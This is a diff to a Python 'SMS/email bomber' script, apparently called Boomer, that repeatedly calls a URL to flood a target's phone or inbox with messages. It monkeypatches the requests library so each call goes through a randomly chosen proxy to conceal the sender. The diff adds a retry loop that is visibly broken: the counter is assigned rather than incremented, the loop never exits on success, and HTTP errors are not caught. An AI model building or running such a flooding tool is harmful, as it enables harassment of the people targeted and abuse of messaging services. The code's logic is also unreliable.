@@ -18,11 +18,13 @@ import random
 
 PROXY_FILE = "proxy.txt"
 
+
 def _load_proxy():
     try:
         with open(PROXY_FILE) as f:
             lines = [l.strip() for l in f if l.strip()]
-        if not lines: return None
+        if not lines:
+            return None
         p = random.choice(lines)
         return p if p.startswith("http") else f"http://{p}"
     except:
@@ -31,12 +33,14 @@ def _load_proxy():
 
 _original_request = requests.sessions.Session.request
 
+
 def _patched_request(self, method, url, **kwargs):
     if "proxies" not in kwargs:
         proxy = _load_proxy()
         if proxy:
             kwargs["proxies"] = {"http": proxy, "https": proxy}
     return _original_request(self, method, url, **kwargs)
+
 
 requests.sessions.Session.request = _patched_request
 """
@@ -48,10 +52,12 @@ r = "\033[0m"
 b = "\033[34m"
 red = "\033[31m"
 
+att = 0
+
 
 def banner():
 
-   b = r"""
+    b = r"""
  ____
 | __ )  ___   ___  _ __ ___   ___ _ __
 |  _ \ / _ \ / _ \| '_ ` _ \ / _ \ '__|
@@ -60,8 +66,7 @@ def banner():
 
                 By Errorking404
 """
-   print(f"{g}{b}{r}")
-
+    print(f"{g}{b}{r}")
 
 
 def menu():
@@ -77,12 +82,19 @@ def smsboom():
     i = 1
     for i in range(1, lim + 1):
         print(f"{g}Launching the Bomber{r}")
-        
+
         print(f"{b}Bomb Launched{r}")
-        resp = requests.get(url)
-        #data = resp.json()
-        #print(data)
-        print(f"{g}{i}, Bomb hit the Target.{r}")
+
+        while True:
+            att = +1
+            try:
+                resp = requests.get(url, timeout=100)
+                resp.raise_for_status()  # throws error if status is 4xx or 5xx
+                print(f"{g}{i}, Bomb hit the Target.{r}")
+            except requests.exceptions.ConnectionError:
+                print(f"No connection. Retrying {att}")
+        # data = resp.json()
+        # print(data)
 
 
 def email():
@@ -94,7 +106,7 @@ def email():
     i = 1
     for i in range(1, lim + 1):
         print(f"{g}Launching Bomber. Please wait{r}")
-        
+
         print(f"{b}Bomb Launched{r}")
         resp = requests.get(url)
         if resp.status_code == 200:
